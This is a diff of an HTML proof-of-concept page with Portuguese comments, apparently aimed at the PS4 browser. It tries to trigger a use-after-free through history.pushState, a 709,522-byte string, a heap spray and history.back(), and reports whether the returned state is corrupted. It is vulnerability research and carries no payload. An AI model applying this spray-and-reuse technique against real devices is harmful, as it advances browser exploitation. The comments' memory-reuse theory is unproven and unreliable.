@@ -1,100 +1,111 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 History UAF PoC</title>
-<style>
-    body { background: #000; color: #0f0; font-family: monospace; font-size: 16px; }
-    .log { border: 1px solid #333; padding: 10px; margin-top: 10px; }
-</style>
+    <title>Precision Heap UAF (709k)</title>
+    <style>
+        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .log-container { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; margin-top: 15px; background: #000; }
+        button { padding: 15px 30px; font-size: 16px; cursor: pointer; background: #222; color: #fff; border: 1px solid #555; }
+        button:hover { background: #444; }
+        .highlight { color: #ffff00; font-weight: bold; }
+    </style>
 </head>
 <body>
-    <h1>History State UAF Trigger</h1>
-    <div id="status">Esperando comando...</div>
-    <div class="log" id="logger"></div>
-    <button onclick="startExploit()">INICIAR TESTE UAF</button>
+    <h1>Precision UAF Tester (Target: 709,522 bytes)</h1>
+    <p>Testando alinhamento de memória específico para trigger de CVE.</p>
+    
+    <button onclick="runPrecisionExploit()">INICIAR TESTE PRECISO</button>
+    
+    <div class="log-container" id="console"></div>
 
     <script>
-        const logger = document.getElementById('logger');
-        
+        const logger = document.getElementById('console');
+        const TARGET_SIZE = 709522; // O NÚMERO MÁGICO
+
         function log(msg) {
-            logger.innerHTML += "<div>" + msg + "</div>";
+            logger.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logger.scrollTop = logger.scrollHeight;
         }
 
-        // Função para tentar forçar o Garbage Collector (GC)
-        // Criando lixo na memória para forçar o browser a limpar coisas antigas
-        function forceGC() {
-            log("Forçando Garbage Collection...");
-            try {
-                var a = [];
-                for (var i = 0; i < 100; i++) {
-                    // Aloca 1MB por iteração
-                    a.push(new ArrayBuffer(1024 * 1024)); 
-                }
-                a = null; // Solta a referência
-                log("GC: Pressão de memória aplicada.");
-            } catch (e) {
-                log("GC: Memória cheia (Isso é bom).");
-            }
-        }
-
-        function startExploit() {
-            log("1. Criando objeto alvo...");
+        // Cria uma string de tamanho EXATO para preencher o Heap
+        function makeStr(size) {
+            var s = "";
+            // Em JS, cada char ocupa 2 bytes (UTF-16) geralmente, 
+            // mas para Buffer/Binary strings pode ser 1.
+            // Vamos assumir que precisamos de uma string cujo "length" resulte nesse footprint.
             
-            // Criamos um objeto específico para rastrear na memória
-            // Usamos um array de inteiros para facilitar a detecção de corrupção
-            var targetObj = { 
-                id: "ALVO_VULNERAVEL", 
-                data: new Array(1000).fill(0x41414141) // Enche com 'AAAA'
+            // Tentativa 1: String repetida
+            while (s.length < size) {
+                s += "A";
+            }
+            return s.slice(0, size);
+        }
+
+        var spray_store = [];
+
+        function runPrecisionExploit() {
+            log(`1. Preparando payload de tamanho exato: ${TARGET_SIZE} bytes...`);
+            
+            // Criamos a string "Vítima"
+            // Se o exploit espera bytes brutos, ArrayBuffer é melhor.
+            // Se espera string JS, usamos makeStr. Vamos testar String primeiro (mais comum em pushState).
+            var vulnerableParams = {
+                id: "marker_uaf",
+                payload: makeStr(TARGET_SIZE) 
             };
 
-            // 2. Salva no histórico
-            log("2. Empurrando para o history.state...");
-            history.pushState(targetObj, "page1", "?state=1");
+            log("2. Payload criado. Injetando no History State...");
 
-            // 3. Remove a referência local
-            targetObj = null;
-            log("3. Referência local removida.");
+            // Empurra o estado vulnerável
+            history.pushState(vulnerableParams, "vuln_page", "?state=vuln");
 
-            // 4. Navega para criar distância
-            history.pushState("LIXO", "page2", "?state=2");
-            log("4. Navegou para novo estado (o alvo ficou pra trás).");
+            log("3. Estado injetado. Removendo referências locais...");
+            vulnerableParams = null; // Remove a referência JS direta
 
-            // 5. Tenta forçar o navegador a esquecer/limpar o objeto do passo 2
+            // Empurra um estado "Tampão" para afastar o ponteiro
+            history.pushState("buffer_state", "buffer_page", "?state=buffer");
+
+            log("4. Estado 'Tampão' criado. Iniciando Memory Pressure...");
+
+            // AGORA: O Spray precisa ter o MESMO tamanho para cair no mesmo buraco
             setTimeout(() => {
-                forceGC(); // Tenta limpar a memória
+                try {
+                    // Tenta forçar o Garbage Collector a limpar o objeto de 709k
+                    // Alocando muita memória rapidamente
+                    for(let i=0; i < 500; i++) {
+                        // Spray com o mesmo tamanho exato para tentar sobrescrever
+                        let fakeObj = makeStr(TARGET_SIZE);
+                        spray_store.push(fakeObj);
+                    }
+                    log(`5. Heap Spray concluído (${spray_store.length} objetos de ${TARGET_SIZE} len).`);
+                } catch(e) {
+                    log("Aviso: Memória cheia durante spray (pode ser bom).");
+                }
 
-                // Aqui faríamos um "Heap Spray" se fosse um exploit real
-                // Para preencher o buraco deixado pelo objeto com código malicioso.
-                // Neste teste, apenas verificamos se crasha ou corrompe.
+                log("6. DISPARANDO: history.back() para acessar memória freed...");
                 
-                log("5. Tentando acessar o objeto antigo (history.back)...");
-                
-                // Volta para o estado 1
+                // O momento da verdade
+                // Se o objeto de 709k foi limpo e sobrescrito pelo spray,
+                // ao voltar, o browser vai ler dados "AAAAAA" achando que é o objeto de estado.
+                // Isso deve causar Crash ou comportamento errático.
                 history.back();
 
-                // O bug acontece no evento 'popstate'
-            }, 1000);
+            }, 500);
         }
 
-        window.onpopstate = function(event) {
-            log("6. Evento popstate disparado!");
-            
-            if (!event.state) {
-                log("FALHA: O estado retornou nulo (Browser se protegeu).");
-                return;
-            }
-
-            // Verifica se o objeto está intacto
-            if (event.state.id === "ALVO_VULNERAVEL") {
-                log("RESULTADO: Objeto recuperado intacto.");
-                log("CONCLUSÃO: Browser gerenciou a memória corretamente (Sem UAF simples).");
+        window.onpopstate = function(e) {
+            if(!e.state) {
+                log("Retorno: State é null (Seguro/Falha no exploit).");
+            } else if (e.state.id === "marker_uaf") {
+                log("<span style='color:red'>FALHA: Objeto recuperado intacto.</span> O GC não limpou a memória.");
+                log("Dica: Tente aumentar a quantidade de 'Spray' ou ajustar o tamanho.");
             } else {
-                // Se cair aqui, ou o ID mudou (Corrupção!) ou crashou antes
-                log("CRÍTICO: Objeto corrompido ou tipo incorreto!");
-                document.body.style.backgroundColor = "red";
-                alert("POSSÍVEL VULNERABILIDADE ENCONTRADA!");
+                // Se cair aqui e não tiver ID, ou tiver ID estranho
+                log("<span class='highlight'>SUCESSO POTENCIAL:</span> O objeto retornou diferente do original!");
+                console.log(e.state);
             }
         };
+
     </script>
 </body>
 </html>
